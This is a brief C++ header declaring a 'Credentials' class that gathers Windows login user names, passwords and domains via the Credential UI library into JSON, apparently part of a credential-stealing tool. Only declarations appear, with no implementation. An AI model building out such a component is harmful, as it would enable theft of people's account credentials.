#pragma once
#include "Configuration.h"
#include <wincred.h>
#include "SystemInfo.h"

#pragma comment(lib, "Credui.lib")
namespace Tool
{
	class Credentials {
		std::string sGatheredCreds = STR("{ \"Login-Credentials\": {");
		void ConvertResults(std::wstring wUserName, std::wstring wPassword, std::wstring wUserDomain, awesomejson::json& jLoginCredentials);
	public:
		int iCounter = 0;
		void GatherLoginCredentials(awesomejson::json& jLoginCredetnails);
	};
}

